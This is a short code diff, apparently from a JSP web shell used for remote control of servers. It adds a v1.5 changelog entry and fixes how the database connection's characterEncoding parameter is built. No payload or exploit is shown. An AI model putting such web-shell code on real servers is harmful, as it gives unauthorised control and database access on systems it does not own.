@@ -24,6 +24,8 @@
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
+  v1.5
+    1. 修正 base64 编码器下连接数据库 characterEncoding 出错
   v1.4
     1. 修正 windows 下基础路径获取盘符会出现小写的情况
   v1.3
@@ -89,7 +91,7 @@ ChangeLog:
         conn = (EC(conn));
         String[] x = conn.trim().replace("\r\n", "\n").split("\n");
         Class.forName(x[0].trim());
-        String url = x[1] + "&characterEncoding=" + decode(EC(encode),encoder);
+        String url = x[1] + "&characterEncoding=" +encode;
         Connection c = DriverManager.getConnection(url);
         Statement stmt = c.createStatement();
         ResultSet rs = stmt.executeQuery(sql);
